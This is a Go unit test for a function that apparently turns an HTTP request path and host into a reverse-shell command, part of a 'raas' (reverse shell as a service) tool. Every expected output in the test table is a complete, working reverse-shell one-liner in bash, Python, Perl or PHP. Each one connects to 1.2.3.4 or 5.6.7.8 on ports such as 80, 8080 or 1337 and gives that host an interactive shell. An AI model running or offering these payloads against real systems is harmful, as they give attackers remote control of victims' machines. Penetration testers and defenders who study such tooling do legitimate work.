package raas

import (
	"testing"
)

func TestURI2Command(t *testing.T) {
	var tests = []struct {
		requestURI string
		httpHost   string
		want       string
	}{
		{"/", "1.2.3.4", "bash -c 'bash -i >/dev/tcp/1.2.3.4/80 0>&1'"},
		{"/", "1.2.3.4:80", "bash -c 'bash -i >/dev/tcp/1.2.3.4/80 0>&1'"},
		{"/", "1.2.3.4:8080", "bash -c 'bash -i >/dev/tcp/1.2.3.4/8080 0>&1'"},
		{"/bash", "1.2.3.4", "bash -c 'bash -i >/dev/tcp/1.2.3.4/80 0>&1'"},
		{"/python", "1.2.3.4:80", `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("1.2.3.4",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`},
		{"/perl", "1.2.3.4:8080", `perl -e 'use Socket;$i="1.2.3.4";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`},
		{"//", "1.2.3.4", "bash -c 'bash -i >/dev/tcp/1.2.3.4/80 0>&1'"},
		{"//", "1.2.3.4:80", "bash -c 'bash -i >/dev/tcp/1.2.3.4/80 0>&1'"},
		{"//", "1.2.3.4:8080", "bash -c 'bash -i >/dev/tcp/1.2.3.4/8080 0>&1'"},
		{"/5.6.7.8", "1.2.3.4", "bash -c 'bash -i >/dev/tcp/1.2.3.4/80 0>&1'"},
		{"/5.6.7.8", "1.2.3.4:80", "bash -c 'bash -i >/dev/tcp/1.2.3.4/80 0>&1'"},
		{"/5.6.7.8", "1.2.3.4:8080", "bash -c 'bash -i >/dev/tcp/1.2.3.4/8080 0>&1'"},
		{"/5.6.7.8/", "1.2.3.4", "bash -c 'bash -i >/dev/tcp/1.2.3.4/80 0>&1'"},
		{"/5.6.7.8/", "1.2.3.4:80", "bash -c 'bash -i >/dev/tcp/1.2.3.4/80 0>&1'"},
		{"/5.6.7.8/", "1.2.3.4:8080", "bash -c 'bash -i >/dev/tcp/1.2.3.4/8080 0>&1'"},
		{"/5.6.7.8/1337", "1.2.3.4", "bash -c 'bash -i >/dev/tcp/5.6.7.8/1337 0>&1'"},
		{"/5.6.7.8/1337", "1.2.3.4:80", "bash -c 'bash -i >/dev/tcp/5.6.7.8/1337 0>&1'"},
		{"/5.6.7.8/1337", "1.2.3.4:8080", "bash -c 'bash -i >/dev/tcp/5.6.7.8/1337 0>&1'"},
		{"/5.6.7.8/1337/", "1.2.3.4", "bash -c 'bash -i >/dev/tcp/5.6.7.8/1337 0>&1'"},
		{"/5.6.7.8/1337/", "1.2.3.4:80", "bash -c 'bash -i >/dev/tcp/5.6.7.8/1337 0>&1'"},
		{"/5.6.7.8/1337/", "1.2.3.4:8080", "bash -c 'bash -i >/dev/tcp/5.6.7.8/1337 0>&1'"},
		{"/5.6.7.8/1337//", "1.2.3.4", "bash -c 'bash -i >/dev/tcp/5.6.7.8/1337 0>&1'"},
		{"/5.6.7.8/1337//", "1.2.3.4:80", "bash -c 'bash -i >/dev/tcp/5.6.7.8/1337 0>&1'"},
		{"/5.6.7.8/1337//", "1.2.3.4:8080", "bash -c 'bash -i >/dev/tcp/5.6.7.8/1337 0>&1'"},
		{"/5.6.7.8/1337/bash", "1.2.3.4", "bash -c 'bash -i >/dev/tcp/5.6.7.8/1337 0>&1'"},
		{"/5.6.7.8/1337/python", "1.2.3.4:80", `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("5.6.7.8",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`},
		{"/5.6.7.8/1337/php", "1.2.3.4:8080", `php -r '$sock=fsockopen("5.6.7.8",1337);shell_exec("/bin/sh -i <&3 >&3 2>&3");'`},
		{"/5.6.7.8/1337//bash", "1.2.3.4", "bash -c 'bash -i >/dev/tcp/5.6.7.8/1337 0>&1'"},
		{"/5.6.7.8/1337//python", "1.2.3.4:80", `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("5.6.7.8",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`},
		{"/5.6.7.8/1337//php", "1.2.3.4:8080", `php -r '$sock=fsockopen("5.6.7.8",1337);shell_exec("/bin/sh -i <&3 >&3 2>&3");'`},
		{"/5.6.7.8/1337/bash/", "1.2.3.4", "bash -c 'bash -i >/dev/tcp/5.6.7.8/1337 0>&1'"},
		{"/5.6.7.8/1337/python/", "1.2.3.4:80", `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("5.6.7.8",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`},
		{"/5.6.7.8/1337/php/", "1.2.3.4:8080", `php -r '$sock=fsockopen("5.6.7.8",1337);shell_exec("/bin/sh -i <&3 >&3 2>&3");'`},
		{"/5.6.7.8/1337/bash//", "1.2.3.4", "bash -c 'bash -i >/dev/tcp/5.6.7.8/1337 0>&1'"},
		{"/5.6.7.8/1337/python//", "1.2.3.4:80", `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("5.6.7.8",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`},
		{"/5.6.7.8/1337/php//", "1.2.3.4:8080", `php -r '$sock=fsockopen("5.6.7.8",1337);shell_exec("/bin/sh -i <&3 >&3 2>&3");'`},
		{"/5.6.7.8/1337/bash//perl", "1.2.3.4", `perl -e 'use Socket;$i="5.6.7.8";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`},
		{"/5.6.7.8/1337/python//perl", "1.2.3.4:80", `perl -e 'use Socket;$i="5.6.7.8";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`},
		{"/5.6.7.8/1337/php//perl", "1.2.3.4:8080", `perl -e 'use Socket;$i="5.6.7.8";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`},
	}
	for _, test := range tests {
		if got := URI2Command(test.requestURI, test.httpHost); got != test.want {
			t.Errorf("TestURI2Command(%q, %q)\n\t[want]\t%v\n\t[got]\t%v\n", test.requestURI, test.httpHost, test.want, got)
		}
	}
}
